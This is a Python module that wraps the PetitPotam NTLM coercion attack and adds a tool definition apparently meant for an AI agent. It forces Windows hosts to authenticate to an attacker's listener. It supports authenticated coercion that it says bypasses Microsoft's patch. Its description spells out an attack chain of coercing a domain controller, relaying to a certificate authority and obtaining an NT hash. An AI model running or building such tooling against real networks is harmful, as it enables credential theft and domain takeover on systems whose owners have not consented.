"""
NTLM coercion via PetitPotam (MS-EFSRPC abuse).
Forces a Windows host to authenticate to a listener IP via NTLM.
Typically combined with impacket_ntlmrelay or responder.
"""
import shlex
import shutil
import subprocess
from core import proc as runner
from typing import Optional


def petitpotam(listener_ip: str, target: str, domain: Optional[str] = None,
               username: Optional[str] = None, password: Optional[str] = None,
               hash: Optional[str] = None, flags: Optional[str] = None) -> dict:
    binary = (shutil.which("PetitPotam.py")
              or shutil.which("petitpotam")
              or shutil.which("petitpotam.py"))
    if not binary:
        return {
            "error": "PetitPotam.py not found. "
                     "Clone: https://github.com/topotam/PetitPotam and run with python3."
        }

    cmd = [binary]

    # Authenticated coercion (more reliable, bypasses MS patch)
    if username and (password or hash):
        if domain:
            cmd += ["-u", f"{domain}\\{username}"]
        else:
            cmd += ["-u", username]
        if password:
            cmd += ["-p", password]
        if hash:
            cmd += ["-hashes", hash]
        if domain:
            cmd += ["-d", domain]

    if flags:
        cmd += shlex.split(flags)

    cmd += [listener_ip, target]

    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=30)
    except subprocess.TimeoutExpired:
        return {"error": "petitpotam timed out", "listener": listener_ip, "target": target}

    output = proc.stdout + proc.stderr
    success = _check_success(output)

    return {
        "listener_ip": listener_ip,
        "target":      target,
        "coerced":     success,
        "authenticated_mode": bool(username),
        "raw":         output[:4000],
        "_command":    " ".join(cmd),
        "next_step":   (
            f"If ntlmrelayx/responder is listening on {listener_ip}, "
            "you should now have a captured NTLM hash or relayed session."
            if success else "No coercion confirmation — check listener output manually."
        ),
    }


def _check_success(output: str) -> bool:
    success_indicators = [
        "Sending EFS request",
        "Sent challenge request",
        "authenticate",
        "successfully",
        "EfsTrigger",
    ]
    out_lower = output.lower()
    return any(ind.lower() in out_lower for ind in success_indicators)


TOOL_DEFINITION = {
    "name": "petitpotam",
    "description": (
        "Coerce Windows hosts into authenticating to a listener via NTLM using MS-EFSRPC (PetitPotam). "
        "The captured NTLM authentication can be relayed (via impacket_ntlmrelay) or captured (via Responder). "
        "Unauthenticated coercion works on unpatched hosts; authenticated coercion works on patched hosts. "
        "Typical attack chain: petitpotam (coerce DC) → ntlmrelayx (relay to CA) → certipy auth (get NT hash).\n"
        "Prerequisites:\n"
        "- impacket_ntlmrelay must be started BEFORE running petitpotam\n"
        "- Target must have NTLM authentication enabled\n"
        "- For relay attacks: target relay destination must have SMB signing disabled"
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "listener_ip": {"type": "string", "description": "Your IP — where ntlmrelayx/responder is listening"},
            "target":      {"type": "string", "description": "Target Windows host IP to coerce"},
            "domain":      {"type": "string", "description": "Domain (for authenticated coercion)"},
            "username":    {"type": "string", "description": "Domain username (for authenticated coercion)"},
            "password":    {"type": "string", "description": "Password"},
            "hash":        {"type": "string", "description": "NTLM hash (LMHASH:NTHASH)"},
            "flags":       {"type": "string", "description": "Additional PetitPotam flags"},
        },
        "required": ["listener_ip", "target"],
    },
}
